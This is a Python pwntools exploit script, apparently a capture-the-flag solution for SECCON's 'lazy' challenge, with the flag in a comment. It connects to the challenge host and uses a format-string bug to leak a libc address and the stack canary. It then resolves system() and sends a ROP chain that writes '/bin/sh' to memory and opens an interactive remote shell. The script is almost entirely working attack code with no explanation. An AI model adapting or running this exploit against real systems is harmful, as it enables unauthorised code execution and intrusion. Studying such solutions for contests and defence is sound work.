#!/usr/bin/env python
from pwn import *

# SECCON{Keep_Going!_KEEP_GOING!_K33P_G01NG!}

context.arch = 'amd64'
e = ELF( './lazy' )
y = remote( 'lazy.chal.seccon.jp' , 33333 )

def pri( p ):
    y.sendlineafter( '4: Manage' , '4' )
    y.sendlineafter( 'Input file name' , p )

def leak( adr ):
    y.sendlineafter( '4: Manage' , '4' )
    p = '%7$sABCD'.ljust( 0x8 , 'a' ) + p64( adr )
    y.sendlineafter( 'Input file name' , p )
    y.recvuntil( 'Filename : ' )
    d = y.recvuntil( 'ABCD' )[:-4] + '\0'
    return d

y.sendlineafter( '3: Exit' , '2' )
y.sendlineafter( ':' , '_H4CK3R_' )
y.sendlineafter( ':' , '3XPL01717' )

p = '%7$s%9$p'.ljust( 0x8 , 'a' ) + p64( e.got.read )
pri( p )
y.recvuntil( 'Filename : ' )
l = u64( y.recv(6) + '\0\0' )

y.recvuntil( '0x' )
canary = int( y.recvuntil( '00' ) , 16 )
print hex( canary )


d = DynELF( leak, l - 0xd6000 )
system = d.lookup( 'system', 'libc' )
print hex( system )

pop_rdi = 0x00000000004015f3
ppr = 0x00000000004015f1

download = 0x400E23
listing = 0x400D72

csu = 0x4015D0

d = e.bss() + 0x100

p = flat(
    'a' * 8,
    0 , 0 ,
    canary,
    0,
    e.plt.atoi,
    pop_rdi,
    0,
    ppr, d , 0, e.plt.read,
    pop_rdi,
    d,
    system
)
pri( p )

y.sendafter( 'No such file!' , '/bin/sh\0' )

y.interactive()